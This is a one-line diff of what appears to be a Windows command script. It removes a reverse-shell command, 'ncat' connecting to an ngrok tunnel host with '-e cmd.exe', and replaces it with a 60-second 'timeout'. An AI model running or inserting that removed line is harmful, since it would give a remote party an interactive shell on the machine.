@@ -1,1 +1,1 @@
-ncat 0.tcp.eu.ngrok.io 13508 -e cmd.exe
+timeout /t 60
